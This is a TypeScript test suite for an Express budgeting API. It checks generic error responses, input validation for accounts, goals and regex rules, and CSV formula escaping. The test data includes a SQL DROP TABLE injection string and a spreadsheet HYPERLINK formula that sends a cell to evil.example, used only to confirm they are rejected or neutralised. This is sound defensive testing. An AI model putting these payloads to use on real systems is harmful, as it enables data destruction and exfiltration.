import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import fc from 'fast-check';
import express from 'express';
import type { AddressInfo } from 'net';
import type { Server } from 'http';
import { migrate } from 'drizzle-orm/better-sqlite3/migrator';
import { db } from '../db/index.js';
import { apiNotFound, errorHandler } from '../middleware/security.js';
import { accountsRouter } from './accounts.js';
import { ACCOUNT_TYPES, defaultOffBudget } from '../utils/accountTypes.js';
import { escapeCsv } from './export.js';
import { goalsRouter } from './goals.js';
import { rulesRouter } from './rules.js';
import { transactionsRouter } from './transactions.js';

let server: Server;
let base: string;

beforeAll(async () => {
  migrate(db, { migrationsFolder: 'src/db/migrations' });
  const app = express();
  app.use(express.json({ limit: '10mb' }));
  app.use('/api/accounts', accountsRouter);
  app.use('/api/goals', goalsRouter);
  app.use('/api/rules', rulesRouter);
  app.use('/api/transactions', transactionsRouter);
  app.get('/api/boom', () => {
    throw new Error('secret internal detail at C:\\Users\\someone\\file.ts');
  });
  app.use('/api', apiNotFound);
  app.use(errorHandler);
  server = await new Promise<Server>((r) => {
    const s = app.listen(0, '127.0.0.1', () => r(s));
  });
  base = `http://127.0.0.1:${(server.address() as AddressInfo).port}/api`;
});
afterAll(() => server.close());

const post = (path: string, body: unknown, raw?: string) =>
  fetch(base + path, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: raw ?? JSON.stringify(body),
  });

describe('error responses never leak internals', () => {
  it('malformed JSON gets a generic 400 JSON error', async () => {
    const res = await post('/accounts', null, '{bad json');
    expect(res.status).toBe(400);
    expect(await res.json()).toEqual({ error: 'Invalid JSON' });
  });

  it('unexpected exceptions get a generic 500 without the message or stack', async () => {
    const res = await fetch(base + '/boom');
    const text = await res.text();
    expect(res.status).toBe(500);
    expect(JSON.parse(text)).toEqual({ error: 'Internal server error' });
    expect(text).not.toMatch(/secret|Users|\.ts|at /);
  });

  it('unknown API routes get a JSON 404', async () => {
    const res = await fetch(base + '/does-not-exist');
    expect(res.status).toBe(404);
    expect(await res.json()).toEqual({ error: 'Not found' });
  });

  it('oversized requests get a 413 JSON error', async () => {
    const res = await post(
      '/accounts',
      null,
      JSON.stringify({ name: 'x'.repeat(11 * 1024 * 1024) }),
    );
    expect(res.status).toBe(413);
    expect(await res.json()).toEqual({ error: 'Request too large' });
  });
});

describe('input validation', () => {
  let accountId: string;
  beforeAll(async () => {
    const res = await post('/accounts', { name: 'Checking', type: 'checking' });
    accountId = (await res.json()).id;
  });

  it('every account type can be created, off budget by default unless it is for spending', async () => {
    for (const type of ACCOUNT_TYPES) {
      const res = await post('/accounts', { name: type, type, startingBalance: -500 });
      expect(res.status, type).toBe(201);
      const account = await res.json();
      expect(account.isOffBudget, type).toBe(defaultOffBudget(type));
      expect(account.balance, type).toBe(-500);
    }
    // An explicit choice wins over the type's default
    const res = await post('/accounts', { name: 'House', type: 'real_estate', isOffBudget: 0 });
    expect((await res.json()).isOffBudget).toBe(0);
  });

  it('rejects unknown account types', async () => {
    await fc.assert(
      fc.asyncProperty(
        fc.string().filter((t) => !(ACCOUNT_TYPES as readonly string[]).includes(t)),
        async (type) => {
          expect((await post('/accounts', { name: 'x', type })).status).toBe(400);
        },
      ),
      { numRuns: 25 },
    );
  });

  it('CSV import rejects rows with invalid dates and accepts valid ones', async () => {
    const row = { date: '2026-01-15', amount: -1234, payeeName: 'Coffee', importedId: 'r1' };
    expect((await post('/transactions/import/preview', { accountId, rows: [row] })).status).toBe(
      200,
    );
    for (const date of ['2026-1-15', 'yesterday', "2026-01-15'; DROP TABLE transactions;--", '']) {
      const res = await post('/transactions/import/preview', {
        accountId,
        rows: [{ ...row, date }],
      });
      expect(res.status, date).toBe(400);
    }
  });

  it('goal target dates must be real YYYY-MM-DD dates', async () => {
    const goal = { name: 'Trip', targetAmount: 100_000 };
    expect((await post('/goals', { ...goal, targetDate: '2027-06-30' })).status).toBe(201);
    expect((await post('/goals', { ...goal, targetDate: 'soon' })).status).toBe(400);
  });

  it('rules reject invalid or oversized regexes but accept normal ones', async () => {
    const rule = (value: string) => ({
      conditions: [{ field: 'payee_name', op: 'regex', value }],
      actions: [{ type: 'set_notes', value: 'x' }],
    });
    expect((await post('/rules', rule('^star(bucks)?'))).status).toBe(201);
    expect((await post('/rules', rule('(unclosed'))).status).toBe(400);
    expect((await post('/rules', rule('a'.repeat(201)))).status).toBe(400);
  });
});

describe('escapeCsv (property-based)', () => {
  // Minimal RFC 4180 cell parser to read back what escapeCsv produced
  const unquote = (cell: string) =>
    cell.startsWith('"') ? cell.slice(1, -1).replace(/""/g, '"') : cell;

  it('never emits a cell a spreadsheet would run as a formula', () => {
    fc.assert(
      fc.property(fc.string(), fc.constantFrom('=', '+', '-', '@', '\t', '\r', ''), (s, lead) => {
        const cell = unquote(escapeCsv(lead + s));
        expect(cell).not.toMatch(/^[=+\-@\t\r]/);
      }),
    );
  });

  it('keeps the original text (after the protective apostrophe) and quotes separators', () => {
    fc.assert(
      fc.property(fc.string(), (s) => {
        const escaped = escapeCsv(s);
        // Only formula-leading text gets the apostrophe; everything else is unchanged
        // (including text that already starts with one, e.g. "'@")
        const expected = /^[=+\-@\t\r]/.test(s) ? `'${s}` : s;
        expect(unquote(escaped)).toBe(expected);
        if (/[",\n\r]/.test(s)) expect(escaped.startsWith('"')).toBe(true);
      }),
    );
  });

  it('leaves text that already starts with an apostrophe alone', () => {
    expect(escapeCsv("'@home")).toBe("'@home");
    expect(escapeCsv("'=1")).toBe("'=1");
  });

  it('neutralizes a real-world payload', () => {
    expect(escapeCsv('=HYPERLINK("https://evil.example/?d="&A1,"Click")')).toBe(
      `"'=HYPERLINK(""https://evil.example/?d=""&A1,""Click"")"`,
    );
  });
});
